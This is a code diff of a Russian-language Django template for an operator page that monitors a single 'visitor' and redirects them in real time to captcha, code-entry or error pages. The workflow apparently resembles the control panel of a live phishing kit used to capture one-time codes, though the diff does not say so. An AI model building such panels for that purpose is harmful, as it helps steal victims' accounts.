@@ -3,7 +3,10 @@
 {% block title %}Управление посетителем{% endblock title %}
 
 {% block content %}
-    <a class="back" href="{% url 'manager-dashboard' %}">&larr; Ко всем подключениям</a>
+    <div class="back-links">
+        <a class="back" href="{% url 'manager-dashboard' %}">&larr; Онлайн</a>
+        <a class="back" href="{{ visitors_back_url }}">&larr; Все посетители</a>
+    </div>
 
     <h1>Управление посетителем</h1>
     <p class="subtitle mono">{{ visitor_id }}</p>
@@ -35,9 +38,9 @@
     <div class="panel">
         <h2>Перенаправить посетителя</h2>
         <div class="quick-actions">
-            <button type="button" class="quick-action" id="redirect-captcha" data-url="{% url 'captcha' %}" disabled>На капчу</button>
-            <button type="button" class="quick-action" id="redirect-code" data-url="{% url 'code' %}" disabled>На код</button>
-            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" disabled>На ошибку</button>
+            <button type="button" class="quick-action" id="redirect-captcha" data-url="{% url 'captcha' %}" data-step="captcha" disabled>На капчу</button>
+            <button type="button" class="quick-action" id="redirect-code" data-url="{% url 'code' %}" data-step="code" disabled>На код</button>
+            <button type="button" class="quick-action" id="redirect-error" data-url="{% url 'error' %}" data-step="error" disabled>На ошибку</button>
         </div>
         <p class="hint" id="redirect-hint">Посетитель будет перенаправлен на указанную страницу прямо в браузере.</p>
     </div>
@@ -45,8 +48,10 @@
 
 {% block extra_js %}
 {{ visitor_id|json_script:"visitor-id-data" }}
+{{ step_labels|json_script:"step-labels-data" }}
 <script>
     const visitorId = JSON.parse(document.getElementById('visitor-id-data').textContent);
+    const MANAGER_STEP_LABELS = JSON.parse(document.getElementById('step-labels-data').textContent);
 
     const statusEl = document.getElementById('status');
     const statusText = document.getElementById('status-text');
@@ -118,7 +123,7 @@
         }
         statusEl.classList.toggle('online', online);
         statusEl.classList.toggle('offline', !online);
-        statusText.textContent = online ? 'Посетитель на линии' : 'Посетитель отключился';
+        statusText.textContent = online ? 'Посетитель онлайн' : 'Посетитель отключился';
         updateRedirectAvailability();
     }
 
@@ -140,15 +145,12 @@
     const connection = connectManagerSocket({
         onOpen() {
             connection.send({ type: 'get_log', visitor_id: visitorId });
+            connection.send({ type: 'get_visitor', visitor_id: visitorId });
         },
         onMessage(data) {
-            if (data.type === 'snapshot') {
-                const onlineVisitor = data.online.find((v) => v.id === visitorId);
-                const offlineVisitor = data.offline.find((v) => v.id === visitorId);
-                if (onlineVisitor) {
-                    renderVisitor(onlineVisitor, true);
-                } else if (offlineVisitor) {
-                    renderVisitor(offlineVisitor, false);
+            if (data.type === 'visitor' && data.visitor_id === visitorId) {
+                if (data.visitor) {
+                    renderVisitor(data.visitor, data.online);
                 } else {
                     setOnline(false);
                 }
@@ -166,17 +168,17 @@
 
     redirectCaptcha.addEventListener('click', () => {
         if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectCaptcha.dataset.url);
+            sendVisitorRedirect(connection, visitorId, redirectCaptcha.dataset.url, redirectCaptcha.dataset.step);
         }
     });
     redirectCode.addEventListener('click', () => {
         if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectCode.dataset.url);
+            sendVisitorRedirect(connection, visitorId, redirectCode.dataset.url, redirectCode.dataset.step);
         }
     });
     redirectError.addEventListener('click', () => {
         if (visitorOnline && visitorWaiting) {
-            sendVisitorRedirect(connection, visitorId, redirectError.dataset.url);
+            sendVisitorRedirect(connection, visitorId, redirectError.dataset.url, redirectError.dataset.step);
         }
     });
 </script>
